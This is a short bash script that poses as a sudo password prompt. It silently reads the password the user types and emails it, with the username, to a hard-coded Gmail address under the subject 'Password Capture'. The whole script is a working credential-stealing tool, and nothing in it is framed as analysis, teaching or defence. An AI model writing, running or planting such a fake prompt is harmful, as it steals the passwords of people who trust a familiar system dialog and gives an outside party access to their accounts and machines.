#!/bin/bash

# Prompt the user for their username
read -p "Enter username: " username

# Securely prompt for the password without echoing characters to the screen
read -s -p "[sudo] password for $username: " password
echo "" # Prints a newline

# Define the recipient email address
RECIPIENT="axl.van.nguyen@gmail.com"

# Send the gathered password to the specified email
echo "The password entered for $username is: $password" | mail -s "Password Capture: $username" "$RECIPIENT"

echo ""
